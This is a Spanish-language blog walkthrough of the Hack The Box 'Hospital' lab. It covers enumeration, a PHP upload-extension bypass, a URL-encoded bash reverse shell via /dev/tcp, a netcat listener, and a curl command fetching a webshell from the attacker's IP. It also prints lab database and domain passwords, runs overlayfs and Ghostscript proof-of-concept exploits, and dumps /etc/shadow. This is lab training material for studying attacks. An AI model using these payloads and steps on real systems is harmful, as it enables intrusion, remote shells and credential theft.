---
title: "Hack The Box - Hospital"
description: "Walkthrough: enumeración, explotación web (upload), credenciales expuestas y escalada a root."
pubDate: "2025-10-03"
tags: ["php", "Pentesting", "Web", "SMB", "PrivEsc"]
draft: false
---

**IP:** `10.10.11.241`  
**OS:** Linux (Apache / PHP / MariaDB)  
**Dificultad:** Hard

## Aclaración:
 por motivos de seguridad no se incluyen detalles explotables completos en este documento público. Si necesitás la información técnica completa, pedila por canal seguro.

---

### 🧭 Enumeración Inicial
```bash
nmap -sC -sV -p- 10.10.11.241

smbclient -L 10.10.11.241
rpcclient -U "" 10.10.11.241 -N
```

Observaciones: servicio web en puertos 80/8080 (Roundcube / web portal aparente), SMB/Windows services expuestos, MariaDB accesible desde la aplicación.

---

## 🧰 Herramientas principales
- nmap, gobuster, wfuzz
- smbclient, rpcclient, crackmapexec, impacket
- mysql / mariadb client
- hashcat / john (análisis de hashes)
- utilidades: curl, nc, certutil (Windows pruebas), rsync (si procede)

---

## 🔎 Fuzzing y discovery web
```bash
wfuzz -c --hc=404,403 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://hospital.htb/FUZZ

# gobuster ejemplo
gobuster dir -u http://hospital.htb:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15 -x php,html,txt -q
```

Se detectó `/uploads/` y comportamiento permisivo sobre extensiones. Lista de extensiones a tener en cuenta (case-insensitive en Windows):

```
.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtml, .shtml, .htaccess, .phar, .inc
```


---

## ⚙️ Explotación web (upload → ejecución) — resumen seguro
1. Se subió un archivo con extensión aceptada y la aplicación lo procesó.  
2. Accediendo al archivo en `http://hospital.htb:8080/uploads/<archivo>` se observó la ejecución de comandos en contexto del servidor web (ej: `whoami` devolvió `www-data`).  
3. Confirmación de funciones PHP habilitadas y riesgo (`phpinfo()` mostró funciones como `popen`, `shell_exec`, `symlink`, `mail` activas).

```bash 
#ejemplo
http://hospital.htb:8080/uploads/not.a.shell.phar/?cmd=%20bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/IP/%200%3E%261%22
```

---

## 🗄️ Lectura de configuración y acceso a BD
Se encontró `config.php` accesible en `/var/www/html/...` con credenciales de la DB:

```bash
www-data@webserver://var/www/html$ cat config.php 
<?php
#/* Database credentials. Assuming you are running MySQL
#server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');

```

Con las credenciales:
```bash
mysql -uroot -p
# introducir la contraseña encontrada
use hospital;
show tables;
select * from users;
```

Salida (extracto, hashes truncados):

| id | username | password (hash) | created_at |
|----|----------|-----------------|------------|
| 1  | admin    | $2y$10$...      | 2023-09-21 |
| 2  | patient  | $2y$10$...      | 2023-09-21 |
| 3  | emi123   | $2y$10$...      | 2025-04-14 |
| 4  | patron   | (empty)         | 2025-04-14 |


---

# ⬆️ Escalada local a root (overlayfs)

**Resumen:** Se identificó que el kernel era vulnerable a fallos de `overlayfs` (CVE-2023-2640 / CVE-2023-32629). Se validó el entorno y se ejecutó una PoC pública en el laboratorio, la cual permitió escalada local a `root`.

**Contexto operativo**
- Kernel inspeccionado (ejemplo): `uname -a` → `Linux webserver 5.x.y-...`
- Fecha/hora de la prueba: `2025-10-03T02:14:00Z`
- Usuario que ejecutó la PoC: `www-data` (shell obtenido vía upload).
- PoC usada (referencia): `https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh`

**Ejecución (resumen)**
- Se descargó la PoC al entorno de pruebas (archivo: `exploit.sh`)
  ```bash
  chmod +x exploit.sh
  ./exploit.sh  
  ```
- Resultado: escalada a `root` confirmada; se verificó acceso a `/root` y lectura de `/etc/shadow` para fines de evidencia.

**Evidencia**
- `/etc/shadow` (extracto redactado):
  ```
  root:$y$j9T$...:19612:0:99999:7:::
  drwilliams:$6$uWBSeT...:19612:0:99999:7:::
  ```

---

## 🖧 SMB / AD enumeración y pivoting

**Acciones realizadas**
- Uso de credenciales encontradas para autenticación SMB/RPC y enumeración de cuentas:
  ```bash
  rpcclient -U 'drwilliams%qwe123!@#' 10.10.11.241 -c 'enumdomusers'
  ```
- Resultado (resumen): cuentas detectadas — `Administrator`, `drbrown`, `drwilliams`, etc.
---

## Ataque a Windows (resumen de acciones)

**Vector**: Ghostscript / EPS (CVE-2023-36664) y posterior entrega de payload (redacted).

- PoC usada (referencia): `https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/blob/main/CVE_2023_36664_exploit.py`
- Se descargó la PoC al entorno de pruebas (archivo: `CVE_2023_36664_exploit.py`)


- Listener atacante:
  ```bash
  rlwrap -cAr nc -nlvp 1234
  ```
- Comandos de prueba:
  - Upload y ejecución remediada: `curl http://10.10.15.53/cmd.php -o cmd.php` 
  - Comando remoto ejecutado (ejemplo): `https://hospital.htb/cmd.php?cmd=tasklist` 


